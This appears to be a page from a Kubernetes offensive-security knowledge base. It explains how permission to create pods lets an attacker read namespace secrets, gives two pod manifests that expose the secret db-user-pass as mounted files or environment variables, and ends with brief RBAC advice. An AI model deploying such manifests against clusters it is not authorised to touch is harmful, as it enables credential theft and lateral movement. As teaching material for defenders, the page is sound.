# New container
Launching a new container in a kubernetes cluster is an extermely powerful permission. Launching a new container can be used to attack other pods in the cluster in a few different ways. If you're allowed to specify your own pod manifest, you have lots of options for how to escalate privielges and move laterally into other namespaces. Additionally, any secrets in a namespace that allows for pods to be created can be compromised as they can be mounted into the pods in cleartext using [Credential Access-> Container Service Account](../Credential_access/Container_service_account.md). 

The following manifest can be deployed into the cluster using `kubectl apply -f <manfiest_name>.yaml`
```yaml
# Mounts the secret db-user-pass into /secrets into the pod
apiVersion: v1
kind: Pod
metadata:
  name: mypod
spec:
  containers:
  - name: mypod
    image: nginx 
    volumeMounts:
    - name: foo
      mountPath: "/secrets"
      readOnly: true
  volumes:
  - name: foo
    secret:
      secretName: db-user-pass 
```

After seeing the manifest, it's obvious that the secerts are mounted in the `/secrets` directory. The secrets will be created in files with the same name of the fields within the secret.
![](../images/Pasted%20image%2020240321105551.png)

## Secrets As Environment Variables
Additionally, secrets can be mounted as environment variables that can be seen by dumping environment variables in a pod. The following manifest puts the kubernetes secrets `username` and `db-user-pass` into environment varaibles `SECRET_USERNAME` and `SECRET_PASSWORD`, respectively.
```yaml
# Mounts the secret db-user-pass -> username 
# into the SECRET_USERNAME environment variable 
# and password into SECRET_PASSWORD
apiVersion: v1
kind: Pod
metadata:
  name: secret-pod
spec:
  containers:
  - name: mycontainer
    image: nginx 
    env:
      - name: SECRET_USERNAME
        valueFrom:
          secretKeyRef:
            name: db-user-pass 
            key: username
      - name: SECRET_PASSWORD
        valueFrom:
          secretKeyRef:
            name: db-user-pass 
            key: password
  restartPolicy: Never
```

After the manifest has been applied, the environment variables are accessible inside the pod to an attacker using the `env` or `export` commands.
![](../images/Pasted%20image%2020240321105836.png)

#### Defending
# Defending
Use RBAC to ensure that pods cannot be created unless absolutely necessary. Secrets are scoped to namespaces so ensuring namespaces are properly used is important. 

> Pull requests needed ❤️ 
